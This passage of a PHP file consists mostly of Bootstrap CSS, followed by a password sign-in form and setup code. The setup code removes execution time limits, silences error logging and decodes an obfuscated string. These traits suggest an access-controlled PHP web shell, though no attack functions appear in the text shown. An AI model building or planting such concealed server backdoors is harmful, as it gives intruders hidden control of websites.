(min-width:992px){.flex-lg-row{-webkit-box-orient:horizontal!important;-webkit-box-direction:normal!important;-ms-flex-direction:row!important;flex-direction:row!important}.flex-lg-column{-webkit-box-orient:vertical!important;-webkit-box-direction:normal!important;-ms-flex-direction:column!important;flex-direction:column!important}.flex-lg-row-reverse{-webkit-box-orient:horizontal!important;-webkit-box-direction:reverse!important;-ms-flex-direction:row-reverse!important;flex-direction:row-reverse!important}.flex-lg-column-reverse{-webkit-box-orient:vertical!important;-webkit-box-direction:reverse!important;-ms-flex-direction:column-reverse!important;flex-direction:column-reverse!important}.flex-lg-wrap{-ms-flex-wrap:wrap!important;flex-wrap:wrap!important}.flex-lg-nowrap{-ms-flex-wrap:nowrap!important;flex-wrap:nowrap!important}.flex-lg-wrap-reverse{-ms-flex-wrap:wrap-reverse!important;flex-wrap:wrap-reverse!important}.justify-content-lg-start{-webkit-box-pack:start!important;-ms-flex-pack:start!important;justify-content:flex-start!important}.justify-content-lg-end{-webkit-box-pack:end!important;-ms-flex-pack:end!important;justify-content:flex-end!important}.justify-content-lg-center{-webkit-box-pack:center!important;-ms-flex-pack:center!important;justify-content:center!important}.justify-content-lg-between{-webkit-box-pack:justify!important;-ms-flex-pack:justify!important;justify-content:space-between!important}.justify-content-lg-around{-ms-flex-pack:distribute!important;justify-content:space-around!important}.align-items-lg-start{-webkit-box-align:start!important;-ms-flex-align:start!important;align-items:flex-start!important}.align-items-lg-end{-webkit-box-align:end!important;-ms-flex-align:end!important;align-items:flex-end!important}.align-items-lg-center{-webkit-box-align:center!important;-ms-flex-align:center!important;align-items:center!important}.align-items-lg-baseline{-webkit-box-align:baseline!important;-ms-flex-align:baseline!important;align-items:baseline!important}.align-items-lg-stretch{-webkit-box-align:stretch!important;-ms-flex-align:stretch!important;align-items:stretch!important}.align-content-lg-start{-ms-flex-line-pack:start!important;align-content:flex-start!important}.align-content-lg-end{-ms-flex-line-pack:end!important;align-content:flex-end!important}.align-content-lg-center{-ms-flex-line-pack:center!important;align-content:center!important}.align-content-lg-between{-ms-flex-line-pack:justify!important;align-content:space-between!important}.align-content-lg-around{-ms-flex-line-pack:distribute!important;align-content:space-around!important}.align-content-lg-stretch{-ms-flex-line-pack:stretch!important;align-content:stretch!important}.align-self-lg-auto{-ms-flex-item-align:auto!important;align-self:auto!important}.align-self-lg-start{-ms-flex-item-align:start!important;align-self:flex-start!important}.align-self-lg-end{-ms-flex-item-align:end!important;align-self:flex-end!important}.align-self-lg-center{-ms-flex-item-align:center!important;align-self:center!important}.align-self-lg-baseline{-ms-flex-item-align:baseline!important;align-self:baseline!important}.align-self-lg-stretch{-ms-flex-item-align:stretch!important;align-self:stretch!important}}@media (min-width:1200px){.flex-xl-row{-webkit-box-orient:horizontal!important;-webkit-box-direction:normal!important;-ms-flex-direction:row!important;flex-direction:row!important}.flex-xl-column{-webkit-box-orient:vertical!important;-webkit-box-direction:normal!important;-ms-flex-direction:column!important;flex-direction:column!important}.flex-xl-row-reverse{-webkit-box-orient:horizontal!important;-webkit-box-direction:reverse!important;-ms-flex-direction:row-reverse!important;flex-direction:row-reverse!important}.flex-xl-column-reverse{-webkit-box-orient:vertical!important;-webkit-box-direction:reverse!important;-ms-flex-direction:column-reverse!important;flex-direction:column-reverse!important}.flex-xl-wrap{-ms-flex-wrap:wrap!important;flex-wrap:wrap!important}.flex-xl-nowrap{-ms-flex-wrap:nowrap!important;flex-wrap:nowrap!important}.flex-xl-wrap-reverse{-ms-flex-wrap:wrap-reverse!important;flex-wrap:wrap-reverse!important}.justify-content-xl-start{-webkit-box-pack:start!important;-ms-flex-pack:start!important;justify-content:flex-start!important}.justify-content-xl-end{-webkit-box-pack:end!important;-ms-flex-pack:end!important;justify-content:flex-end!important}.justify-content-xl-center{-webkit-box-pack:center!important;-ms-flex-pack:center!important;justify-content:center!important}.justify-content-xl-between{-webkit-box-pack:justify!important;-ms-flex-pack:justify!important;justify-content:space-between!important}.justify-content-xl-around{-ms-flex-pack:distribute!important;justify-content:space-around!important}.align-items-xl-start{-webkit-box-align:start!important;-ms-flex-align:start!important;align-items:flex-start!important}.align-items-xl-end{-webkit-box-align:end!important;-ms-flex-align:end!important;align-items:flex-end!important}.align-items-xl-center{-webkit-box-align:center!important;-ms-flex-align:center!important;align-items:center!important}.align-items-xl-baseline{-webkit-box-align:baseline!important;-ms-flex-align:baseline!important;align-items:baseline!important}.align-items-xl-stretch{-webkit-box-align:stretch!important;-ms-flex-align:stretch!important;align-items:stretch!important}.align-content-xl-start{-ms-flex-line-pack:start!important;align-content:flex-start!important}.align-content-xl-end{-ms-flex-line-pack:end!important;align-content:flex-end!important}.align-content-xl-center{-ms-flex-line-pack:center!important;align-content:center!important}.align-content-xl-between{-ms-flex-line-pack:justify!important;align-content:space-between!important}.align-content-xl-around{-ms-flex-line-pack:distribute!important;align-content:space-around!important}.align-content-xl-stretch{-ms-flex-line-pack:stretch!important;align-content:stretch!important}.align-self-xl-auto{-ms-flex-item-align:auto!important;align-self:auto!important}.align-self-xl-start{-ms-flex-item-align:start!important;align-self:flex-start!important}.align-self-xl-end{-ms-flex-item-align:end!important;align-self:flex-end!important}.align-self-xl-center{-ms-flex-item-align:center!important;align-self:center!important}.align-self-xl-baseline{-ms-flex-item-align:baseline!important;align-self:baseline!important}.align-self-xl-stretch{-ms-flex-item-align:stretch!important;align-self:stretch!important}}.float-left{float:left!important}.float-right{float:right!important}.float-none{float:none!important}@media (min-width:576px){.float-sm-left{float:left!important}.float-sm-right{float:right!important}.float-sm-none{float:none!important}}@media (min-width:768px){.float-md-left{float:left!important}.float-md-right{float:right!important}.float-md-none{float:none!important}}@media (min-width:992px){.float-lg-left{float:left!important}.float-lg-right{float:right!important}.float-lg-none{float:none!important}}@media (min-width:1200px){.float-xl-left{float:left!important}.float-xl-right{float:right!important}.float-xl-none{float:none!important}}.position-static{position:static!important}.position-relative{position:relative!important}.position-absolute{position:absolute!important}.position-fixed{position:fixed!important}.position-sticky{position:-webkit-sticky!important;position:sticky!important}.fixed-top{position:fixed;top:0;right:0;left:0;z-index:1030}.fixed-bottom{position:fixed;right:0;bottom:0;left:0;z-index:1030}@supports ((position:-webkit-sticky) or (position:sticky)){.sticky-top{position:-webkit-sticky;position:sticky;top:0;z-index:1020}}.sr-only{position:absolute;width:1px;height:1px;padding:0;overflow:hidden;clip:rect(0,0,0,0);white-space:nowrap;-webkit-clip-path:inset(50%);clip-path:inset(50%);border:0}.sr-only-focusable:active,.sr-only-focusable:focus{position:static;width:auto;height:auto;overflow:visible;clip:auto;white-space:normal;-webkit-clip-path:none;clip-path:none}.w-25{width:25%!important}.w-50{width:50%!important}.w-75{width:75%!important}.w-100{width:100%!important}.h-25{height:25%!important}.h-50{height:50%!important}.h-75{height:75%!important}.h-100{height:100%!important}.mw-100{max-width:100%!important}.mh-100{max-height:100%!important}.m-0{margin:0!important}.mt-0,.my-0{margin-top:0!important}.mr-0,.mx-0{margin-right:0!important}.mb-0,.my-0{margin-bottom:0!important}.ml-0,.mx-0{margin-left:0!important}.m-1{margin:.25rem!important}.mt-1,.my-1{margin-top:.25rem!important}.mr-1,.mx-1{margin-right:.25rem!important}.mb-1,.my-1{margin-bottom:.25rem!important}.ml-1,.mx-1{margin-left:.25rem!important}.m-2{margin:.5rem!important}.mt-2,.my-2{margin-top:.5rem!important}.mr-2,.mx-2{margin-right:.5rem!important}.mb-2,.my-2{margin-bottom:.5rem!important}.ml-2,.mx-2{margin-left:.5rem!important}.m-3{margin:1rem!important}.mt-3,.my-3{margin-top:1rem!important}.mr-3,.mx-3{margin-right:1rem!important}.mb-3,.my-3{margin-bottom:1rem!important}.ml-3,.mx-3{margin-left:1rem!important}.m-4{margin:1.5rem!important}.mt-4,.my-4{margin-top:1.5rem!important}.mr-4,.mx-4{margin-right:1.5rem!important}.mb-4,.my-4{margin-bottom:1.5rem!important}.ml-4,.mx-4{margin-left:1.5rem!important}.m-5{margin:3rem!important}.mt-5,.my-5{margin-top:3rem!important}.mr-5,.mx-5{margin-right:3rem!important}.mb-5,.my-5{margin-bottom:3rem!important}.ml-5,.mx-5{margin-left:3rem!important}.p-0{padding:0!important}.pt-0,.py-0{padding-top:0!important}.pr-0,.px-0{padding-right:0!important}.pb-0,.py-0{padding-bottom:0!important}.pl-0,.px-0{padding-left:0!important}.p-1{padding:.25rem!important}.pt-1,.py-1{padding-top:.25rem!important}.pr-1,.px-1{padding-right:.25rem!important}.pb-1,.py-1{padding-bottom:.25rem!important}.pl-1,.px-1{padding-left:.25rem!important}.p-2{padding:.5rem!important}.pt-2,.py-2{padding-top:.5rem!important}.pr-2,.px-2{padding-right:.5rem!important}.pb-2,.py-2{padding-bottom:.5rem!important}.pl-2,.px-2{padding-left:.5rem!important}.p-3{padding:1rem!important}.pt-3,.py-3{padding-top:1rem!important}.pr-3,.px-3{padding-right:1rem!important}.pb-3,.py-3{padding-bottom:1rem!important}.pl-3,.px-3{padding-left:1rem!important}.p-4{padding:1.5rem!important}.pt-4,.py-4{padding-top:1.5rem!important}.pr-4,.px-4{padding-right:1.5rem!important}.pb-4,.py-4{padding-bottom:1.5rem!important}.pl-4,.px-4{padding-left:1.5rem!important}.p-5{padding:3rem!important}.pt-5,.py-5{padding-top:3rem!important}.pr-5,.px-5{padding-right:3rem!important}.pb-5,.py-5{padding-bottom:3rem!important}.pl-5,.px-5{padding-left:3rem!important}.m-auto{margin:auto!important}.mt-auto,.my-auto{margin-top:auto!important}.mr-auto,.mx-auto{margin-right:auto!important}.mb-auto,.my-auto{margin-bottom:auto!important}.ml-auto,.mx-auto{margin-left:auto!important}@media (min-width:576px){.m-sm-0{margin:0!important}.mt-sm-0,.my-sm-0{margin-top:0!important}.mr-sm-0,.mx-sm-0{margin-right:0!important}.mb-sm-0,.my-sm-0{margin-bottom:0!important}.ml-sm-0,.mx-sm-0{margin-left:0!important}.m-sm-1{margin:.25rem!important}.mt-sm-1,.my-sm-1{margin-top:.25rem!important}.mr-sm-1,.mx-sm-1{margin-right:.25rem!important}.mb-sm-1,.my-sm-1{margin-bottom:.25rem!important}.ml-sm-1,.mx-sm-1{margin-left:.25rem!important}.m-sm-2{margin:.5rem!important}.mt-sm-2,.my-sm-2{margin-top:.5rem!important}.mr-sm-2,.mx-sm-2{margin-right:.5rem!important}.mb-sm-2,.my-sm-2{margin-bottom:.5rem!important}.ml-sm-2,.mx-sm-2{margin-left:.5rem!important}.m-sm-3{margin:1rem!important}.mt-sm-3,.my-sm-3{margin-top:1rem!important}.mr-sm-3,.mx-sm-3{margin-right:1rem!important}.mb-sm-3,.my-sm-3{margin-bottom:1rem!important}.ml-sm-3,.mx-sm-3{margin-left:1rem!important}.m-sm-4{margin:1.5rem!important}.mt-sm-4,.my-sm-4{margin-top:1.5rem!important}.mr-sm-4,.mx-sm-4{margin-right:1.5rem!important}.mb-sm-4,.my-sm-4{margin-bottom:1.5rem!important}.ml-sm-4,.mx-sm-4{margin-left:1.5rem!important}.m-sm-5{margin:3rem!important}.mt-sm-5,.my-sm-5{margin-top:3rem!important}.mr-sm-5,.mx-sm-5{margin-right:3rem!important}.mb-sm-5,.my-sm-5{margin-bottom:3rem!important}.ml-sm-5,.mx-sm-5{margin-left:3rem!important}.p-sm-0{padding:0!important}.pt-sm-0,.py-sm-0{padding-top:0!important}.pr-sm-0,.px-sm-0{padding-right:0!important}.pb-sm-0,.py-sm-0{padding-bottom:0!important}.pl-sm-0,.px-sm-0{padding-left:0!important}.p-sm-1{padding:.25rem!important}.pt-sm-1,.py-sm-1{padding-top:.25rem!important}.pr-sm-1,.px-sm-1{padding-right:.25rem!important}.pb-sm-1,.py-sm-1{padding-bottom:.25rem!important}.pl-sm-1,.px-sm-1{padding-left:.25rem!important}.p-sm-2{padding:.5rem!important}.pt-sm-2,.py-sm-2{padding-top:.5rem!important}.pr-sm-2,.px-sm-2{padding-right:.5rem!important}.pb-sm-2,.py-sm-2{padding-bottom:.5rem!important}.pl-sm-2,.px-sm-2{padding-left:.5rem!important}.p-sm-3{padding:1rem!important}.pt-sm-3,.py-sm-3{padding-top:1rem!important}.pr-sm-3,.px-sm-3{padding-right:1rem!important}.pb-sm-3,.py-sm-3{padding-bottom:1rem!important}.pl-sm-3,.px-sm-3{padding-left:1rem!important}.p-sm-4{padding:1.5rem!important}.pt-sm-4,.py-sm-4{padding-top:1.5rem!important}.pr-sm-4,.px-sm-4{padding-right:1.5rem!important}.pb-sm-4,.py-sm-4{padding-bottom:1.5rem!important}.pl-sm-4,.px-sm-4{padding-left:1.5rem!important}.p-sm-5{padding:3rem!important}.pt-sm-5,.py-sm-5{padding-top:3rem!important}.pr-sm-5,.px-sm-5{padding-right:3rem!important}.pb-sm-5,.py-sm-5{padding-bottom:3rem!important}.pl-sm-5,.px-sm-5{padding-left:3rem!important}.m-sm-auto{margin:auto!important}.mt-sm-auto,.my-sm-auto{margin-top:auto!important}.mr-sm-auto,.mx-sm-auto{margin-right:auto!important}.mb-sm-auto,.my-sm-auto{margin-bottom:auto!important}.ml-sm-auto,.mx-sm-auto{margin-left:auto!important}}@media (min-width:768px){.m-md-0{margin:0!important}.mt-md-0,.my-md-0{margin-top:0!important}.mr-md-0,.mx-md-0{margin-right:0!important}.mb-md-0,.my-md-0{margin-bottom:0!important}.ml-md-0,.mx-md-0{margin-left:0!important}.m-md-1{margin:.25rem!important}.mt-md-1,.my-md-1{margin-top:.25rem!important}.mr-md-1,.mx-md-1{margin-right:.25rem!important}.mb-md-1,.my-md-1{margin-bottom:.25rem!important}.ml-md-1,.mx-md-1{margin-left:.25rem!important}.m-md-2{margin:.5rem!important}.mt-md-2,.my-md-2{margin-top:.5rem!important}.mr-md-2,.mx-md-2{margin-right:.5rem!important}.mb-md-2,.my-md-2{margin-bottom:.5rem!important}.ml-md-2,.mx-md-2{margin-left:.5rem!important}.m-md-3{margin:1rem!important}.mt-md-3,.my-md-3{margin-top:1rem!important}.mr-md-3,.mx-md-3{margin-right:1rem!important}.mb-md-3,.my-md-3{margin-bottom:1rem!important}.ml-md-3,.mx-md-3{margin-left:1rem!important}.m-md-4{margin:1.5rem!important}.mt-md-4,.my-md-4{margin-top:1.5rem!important}.mr-md-4,.mx-md-4{margin-right:1.5rem!important}.mb-md-4,.my-md-4{margin-bottom:1.5rem!important}.ml-md-4,.mx-md-4{margin-left:1.5rem!important}.m-md-5{margin:3rem!important}.mt-md-5,.my-md-5{margin-top:3rem!important}.mr-md-5,.mx-md-5{margin-right:3rem!important}.mb-md-5,.my-md-5{margin-bottom:3rem!important}.ml-md-5,.mx-md-5{margin-left:3rem!important}.p-md-0{padding:0!important}.pt-md-0,.py-md-0{padding-top:0!important}.pr-md-0,.px-md-0{padding-right:0!important}.pb-md-0,.py-md-0{padding-bottom:0!important}.pl-md-0,.px-md-0{padding-left:0!important}.p-md-1{padding:.25rem!important}.pt-md-1,.py-md-1{padding-top:.25rem!important}.pr-md-1,.px-md-1{padding-right:.25rem!important}.pb-md-1,.py-md-1{padding-bottom:.25rem!important}.pl-md-1,.px-md-1{padding-left:.25rem!important}.p-md-2{padding:.5rem!important}.pt-md-2,.py-md-2{padding-top:.5rem!important}.pr-md-2,.px-md-2{padding-right:.5rem!important}.pb-md-2,.py-md-2{padding-bottom:.5rem!important}.pl-md-2,.px-md-2{padding-left:.5rem!important}.p-md-3{padding:1rem!important}.pt-md-3,.py-md-3{padding-top:1rem!important}.pr-md-3,.px-md-3{padding-right:1rem!important}.pb-md-3,.py-md-3{padding-bottom:1rem!important}.pl-md-3,.px-md-3{padding-left:1rem!important}.p-md-4{padding:1.5rem!important}.pt-md-4,.py-md-4{padding-top:1.5rem!important}.pr-md-4,.px-md-4{padding-right:1.5rem!important}.pb-md-4,.py-md-4{padding-bottom:1.5rem!important}.pl-md-4,.px-md-4{padding-left:1.5rem!important}.p-md-5{padding:3rem!important}.pt-md-5,.py-md-5{padding-top:3rem!important}.pr-md-5,.px-md-5{padding-right:3rem!important}.pb-md-5,.py-md-5{padding-bottom:3rem!important}.pl-md-5,.px-md-5{padding-left:3rem!important}.m-md-auto{margin:auto!important}.mt-md-auto,.my-md-auto{margin-top:auto!important}.mr-md-auto,.mx-md-auto{margin-right:auto!important}.mb-md-auto,.my-md-auto{margin-bottom:auto!important}.ml-md-auto,.mx-md-auto{margin-left:auto!important}}@media (min-width:992px){.m-lg-0{margin:0!important}.mt-lg-0,.my-lg-0{margin-top:0!important}.mr-lg-0,.mx-lg-0{margin-right:0!important}.mb-lg-0,.my-lg-0{margin-bottom:0!important}.ml-lg-0,.mx-lg-0{margin-left:0!important}.m-lg-1{margin:.25rem!important}.mt-lg-1,.my-lg-1{margin-top:.25rem!important}.mr-lg-1,.mx-lg-1{margin-right:.25rem!important}.mb-lg-1,.my-lg-1{margin-bottom:.25rem!important}.ml-lg-1,.mx-lg-1{margin-left:.25rem!important}.m-lg-2{margin:.5rem!important}.mt-lg-2,.my-lg-2{margin-top:.5rem!important}.mr-lg-2,.mx-lg-2{margin-right:.5rem!important}.mb-lg-2,.my-lg-2{margin-bottom:.5rem!important}.ml-lg-2,.mx-lg-2{margin-left:.5rem!important}.m-lg-3{margin:1rem!important}.mt-lg-3,.my-lg-3{margin-top:1rem!important}.mr-lg-3,.mx-lg-3{margin-right:1rem!important}.mb-lg-3,.my-lg-3{margin-bottom:1rem!important}.ml-lg-3,.mx-lg-3{margin-left:1rem!important}.m-lg-4{margin:1.5rem!important}.mt-lg-4,.my-lg-4{margin-top:1.5rem!important}.mr-lg-4,.mx-lg-4{margin-right:1.5rem!important}.mb-lg-4,.my-lg-4{margin-bottom:1.5rem!important}.ml-lg-4,.mx-lg-4{margin-left:1.5rem!important}.m-lg-5{margin:3rem!important}.mt-lg-5,.my-lg-5{margin-top:3rem!important}.mr-lg-5,.mx-lg-5{margin-right:3rem!important}.mb-lg-5,.my-lg-5{margin-bottom:3rem!important}.ml-lg-5,.mx-lg-5{margin-left:3rem!important}.p-lg-0{padding:0!important}.pt-lg-0,.py-lg-0{padding-top:0!important}.pr-lg-0,.px-lg-0{padding-right:0!important}.pb-lg-0,.py-lg-0{padding-bottom:0!important}.pl-lg-0,.px-lg-0{padding-left:0!important}.p-lg-1{padding:.25rem!important}.pt-lg-1,.py-lg-1{padding-top:.25rem!important}.pr-lg-1,.px-lg-1{padding-right:.25rem!important}.pb-lg-1,.py-lg-1{padding-bottom:.25rem!important}.pl-lg-1,.px-lg-1{padding-left:.25rem!important}.p-lg-2{padding:.5rem!important}.pt-lg-2,.py-lg-2{padding-top:.5rem!important}.pr-lg-2,.px-lg-2{padding-right:.5rem!important}.pb-lg-2,.py-lg-2{padding-bottom:.5rem!important}.pl-lg-2,.px-lg-2{padding-left:.5rem!important}.p-lg-3{padding:1rem!important}.pt-lg-3,.py-lg-3{padding-top:1rem!important}.pr-lg-3,.px-lg-3{padding-right:1rem!important}.pb-lg-3,.py-lg-3{padding-bottom:1rem!important}.pl-lg-3,.px-lg-3{padding-left:1rem!important}.p-lg-4{padding:1.5rem!important}.pt-lg-4,.py-lg-4{padding-top:1.5rem!important}.pr-lg-4,.px-lg-4{padding-right:1.5rem!important}.pb-lg-4,.py-lg-4{padding-bottom:1.5rem!important}.pl-lg-4,.px-lg-4{padding-left:1.5rem!important}.p-lg-5{padding:3rem!important}.pt-lg-5,.py-lg-5{padding-top:3rem!important}.pr-lg-5,.px-lg-5{padding-right:3rem!important}.pb-lg-5,.py-lg-5{padding-bottom:3rem!important}.pl-lg-5,.px-lg-5{padding-left:3rem!important}.m-lg-auto{margin:auto!important}.mt-lg-auto,.my-lg-auto{margin-top:auto!important}.mr-lg-auto,.mx-lg-auto{margin-right:auto!important}.mb-lg-auto,.my-lg-auto{margin-bottom:auto!important}.ml-lg-auto,.mx-lg-auto{margin-left:auto!important}}@media (min-width:1200px){.m-xl-0{margin:0!important}.mt-xl-0,.my-xl-0{margin-top:0!important}.mr-xl-0,.mx-xl-0{margin-right:0!important}.mb-xl-0,.my-xl-0{margin-bottom:0!important}.ml-xl-0,.mx-xl-0{margin-left:0!important}.m-xl-1{margin:.25rem!important}.mt-xl-1,.my-xl-1{margin-top:.25rem!important}.mr-xl-1,.mx-xl-1{margin-right:.25rem!important}.mb-xl-1,.my-xl-1{margin-bottom:.25rem!important}.ml-xl-1,.mx-xl-1{margin-left:.25rem!important}.m-xl-2{margin:.5rem!important}.mt-xl-2,.my-xl-2{margin-top:.5rem!important}.mr-xl-2,.mx-xl-2{margin-right:.5rem!important}.mb-xl-2,.my-xl-2{margin-bottom:.5rem!important}.ml-xl-2,.mx-xl-2{margin-left:.5rem!important}.m-xl-3{margin:1rem!important}.mt-xl-3,.my-xl-3{margin-top:1rem!important}.mr-xl-3,.mx-xl-3{margin-right:1rem!important}.mb-xl-3,.my-xl-3{margin-bottom:1rem!important}.ml-xl-3,.mx-xl-3{margin-left:1rem!important}.m-xl-4{margin:1.5rem!important}.mt-xl-4,.my-xl-4{margin-top:1.5rem!important}.mr-xl-4,.mx-xl-4{margin-right:1.5rem!important}.mb-xl-4,.my-xl-4{margin-bottom:1.5rem!important}.ml-xl-4,.mx-xl-4{margin-left:1.5rem!important}.m-xl-5{margin:3rem!important}.mt-xl-5,.my-xl-5{margin-top:3rem!important}.mr-xl-5,.mx-xl-5{margin-right:3rem!important}.mb-xl-5,.my-xl-5{margin-bottom:3rem!important}.ml-xl-5,.mx-xl-5{margin-left:3rem!important}.p-xl-0{padding:0!important}.pt-xl-0,.py-xl-0{padding-top:0!important}.pr-xl-0,.px-xl-0{padding-right:0!important}.pb-xl-0,.py-xl-0{padding-bottom:0!important}.pl-xl-0,.px-xl-0{padding-left:0!important}.p-xl-1{padding:.25rem!important}.pt-xl-1,.py-xl-1{padding-top:.25rem!important}.pr-xl-1,.px-xl-1{padding-right:.25rem!important}.pb-xl-1,.py-xl-1{padding-bottom:.25rem!important}.pl-xl-1,.px-xl-1{padding-left:.25rem!important}.p-xl-2{padding:.5rem!important}.pt-xl-2,.py-xl-2{padding-top:.5rem!important}.pr-xl-2,.px-xl-2{padding-right:.5rem!important}.pb-xl-2,.py-xl-2{padding-bottom:.5rem!important}.pl-xl-2,.px-xl-2{padding-left:.5rem!important}.p-xl-3{padding:1rem!important}.pt-xl-3,.py-xl-3{padding-top:1rem!important}.pr-xl-3,.px-xl-3{padding-right:1rem!important}.pb-xl-3,.py-xl-3{padding-bottom:1rem!important}.pl-xl-3,.px-xl-3{padding-left:1rem!important}.p-xl-4{padding:1.5rem!important}.pt-xl-4,.py-xl-4{padding-top:1.5rem!important}.pr-xl-4,.px-xl-4{padding-right:1.5rem!important}.pb-xl-4,.py-xl-4{padding-bottom:1.5rem!important}.pl-xl-4,.px-xl-4{padding-left:1.5rem!important}.p-xl-5{padding:3rem!important}.pt-xl-5,.py-xl-5{padding-top:3rem!important}.pr-xl-5,.px-xl-5{padding-right:3rem!important}.pb-xl-5,.py-xl-5{padding-bottom:3rem!important}.pl-xl-5,.px-xl-5{padding-left:3rem!important}.m-xl-auto{margin:auto!important}.mt-xl-auto,.my-xl-auto{margin-top:auto!important}.mr-xl-auto,.mx-xl-auto{margin-right:auto!important}.mb-xl-auto,.my-xl-auto{margin-bottom:auto!important}.ml-xl-auto,.mx-xl-auto{margin-left:auto!important}}.text-justify{text-align:justify!important}.text-nowrap{white-space:nowrap!important}.text-truncate{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.text-left{text-align:left!important}.text-right{text-align:right!important}.text-center{text-align:center!important}@media (min-width:576px){.text-sm-left{text-align:left!important}.text-sm-right{text-align:right!important}.text-sm-center{text-align:center!important}}@media (min-width:768px){.text-md-left{text-align:left!important}.text-md-right{text-align:right!important}.text-md-center{text-align:center!important}}@media (min-width:992px){.text-lg-left{text-align:left!important}.text-lg-right{text-align:right!important}.text-lg-center{text-align:center!important}}@media (min-width:1200px){.text-xl-left{text-align:left!important}.text-xl-right{text-align:right!important}.text-xl-center{text-align:center!important}}.text-lowercase{text-transform:lowercase!important}.text-uppercase{text-transform:uppercase!important}.text-capitalize{text-transform:capitalize!important}.font-weight-light{font-weight:300!important}.font-weight-normal{font-weight:400!important}.font-weight-bold{font-weight:700!important}.font-italic{font-style:italic!important}.text-white{color:#fff!important}.text-primary{color:#007bff!important}a.text-primary:focus,a.text-primary:hover{color:#0062cc!important}.text-secondary{color:#6c757d!important}a.text-secondary:focus,a.text-secondary:hover{color:#545b62!important}.text-success{color:#28a745!important}a.text-success:focus,a.text-success:hover{color:#1e7e34!important}.text-info{color:#17a2b8!important}a.text-info:focus,a.text-info:hover{color:#117a8b!important}.text-warning{color:#ffc107!important}a.text-warning:focus,a.text-warning:hover{color:#d39e00!important}.text-danger{color:#dc3545!important}a.text-danger:focus,a.text-danger:hover{color:#bd2130!important}.text-light{color:#f8f9fa!important}a.text-light:focus,a.text-light:hover{color:#dae0e5!important}.text-dark{color:#343a40!important}a.text-dark:focus,a.text-dark:hover{color:#1d2124!important}.text-muted{color:#6c757d!important}.text-hide{font:0/0 a;color:transparent;text-shadow:none;background-color:transparent;border:0}.visible{visibility:visible!important}.invisible{visibility:hidden!important}@media print{*,::after,::before{text-shadow:none!important;box-shadow:none!important}a:not(.btn){text-decoration:underline}abbr[title]::after{content:" (" attr(title) ")"}pre{white-space:pre-wrap!important}blockquote,pre{border:1px solid #999;page-break-inside:avoid}thead{display:table-header-group}img,tr{page-break-inside:avoid}h2,h3,p{orphans:3;widows:3}h2,h3{page-break-after:avoid}@page{size:a3}body{min-width:992px!important}.container{min-width:992px!important}.navbar{display:none}.badge{border:1px solid #000}.table{border-collapse:collapse!important}.table td,.table th{background-color:#fff!important}.table-bordered td,.table-bordered th{border:1px solid #ddd!important}}
</style>
<style type='text/css'>
	html,body{
	height:100%;
	}
	body{
	display:-ms-flexbox;
	display:-webkit-box;
	display:flex;
	-ms-flex-align:center;
	-ms-flex-pack:center;
	-webkit-box-align:center;
	align-items:center;
	-webkit-box-pack:center;
	justify-content:center;
	padding-top:40px;
	padding-bottom:40px;
	background-color:#f5f5f5;
	}
	.form-signin{
	width:100%;
	max-width:330px;
	padding:15px;
	margin:0 auto;
	}
	.form-signin.checkbox{
	font-weight:400;
	}
	.form-signin.form-control{
	position:relative;
	box-sizing:border-box;
	height:auto;
	padding:10px;
	font-size:16px;
	}
	.form-signin.form-control:focus{
	z-index:2;
	}
	.form-signin input[type="email"]{
	margin-bottom:-1px;
	border-bottom-right-radius:0;
	border-bottom-left-radius:0;
	}
	.form-signin input[type="password"]{
	margin-bottom:10px;
	border-top-left-radius:0;
	border-top-right-radius:0;
	}
</style>
</head>
<body class="text-center">
	
	<form class="form-signin" method='post'>
		<h1 class="h3 mb-3 font-weight-normal"><svg version="1.0" xmlns="http://www.w3.org/2000/svg" width="100.000000pt" height="65.000000pt" viewBox="0 0 100.000000 65.000000" preserveAspectRatio="xMidYMid meet">

                                                <g transform="translate(0.000000,65.000000) scale(0.100000,-0.100000)"
                                                fill="#000000" stroke="none">
                                                <path d="M291 619 c-36 -25 -42 -34 -37 -55 6 -24 6 -24 -76 -24 -46 1 -102 5
                                                -126 9 -27 5 -45 5 -49 -2 -6 -11 62 -80 88 -89 11 -4 14 -35 14 -174 0 -93
                                                -4 -193 -8 -222 -10 -64 7 -70 51 -16 43 52 54 101 55 256 l1 138 38 0 38 0 0
                                                -82 c-1 -46 -5 -117 -10 -158 -4 -41 -6 -77 -4 -80 9 -8 39 17 72 59 32 42 32
                                                44 32 152 l0 109 35 0 35 0 -1 -157 c0 -87 -4 -184 -8 -216 -7 -54 -6 -58 13
                                                -55 11 2 36 25 55 53 l36 49 4 163 c3 153 4 163 22 163 29 0 33 26 10 63 -30
                                                50 -58 72 -73 59 -7 -5 -39 -13 -70 -17 l-58 -7 0 56 c0 68 -14 72 -79 25z"/>
                                                </g>
                                                </svg></h1>
		<label for="username" class="sr-only">Email address</label>
		<input type="text" name="username" id="username" class="form-control" placeholder="Username" autocomplete="off" required autofocus>
		<label for="password" class="sr-only">Password</label>
		<input type="password" name="password" id="password" class="form-control" placeholder="Password" autocomplete="off" required>
		<button class="btn btn-lg btn-primary btn-block" type="submit" name="signin" value="signin">Sign In</button>
		<p class="mt-5 mb-3 text-muted">&copy;2021-<?=date('Y')?></p>
	</form>
</body>
</html><?php
}
else
{
ob_start(); // Prevent Double Html $_REQUEST

if(!strpos(strval(ini_get('disable_functions')),'set_time_limit'))
{
	set_time_limit(0);
}

// Debug Settings
if($config['debug']==true) 
{
	set_error_handler('error'); // Error Handler
	error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
}
else
{
	error_reporting(0);
	ini_set('error_log',null);
	ini_set('html_errors',0);
	ini_set('log_errors',0);
	ini_set('log_errors_max_len',0);
	ini_set('display_errors',0);
	ini_set('display_startup_errors',0);
}

ini_set('max_execution_time','600');
ini_set('memory_limit','256M');

$agent=B64D("FT06ACQoAXYrvHYXMUIMMV5e");   // Powered by 
$title=$config['title'];                   // Title Page
$start=microtime(true);                    // Time Pageload

?><!DOCTYPE html>
<html>
<head>
<link rel="preconnect" href="https://fonts.gstatic.com">
<link href="https://fonts.googleapis.com/css2?family=Open+Sans&display=swap" rel="stylesheet">
<meta name='author' content='maRidoNo'/>
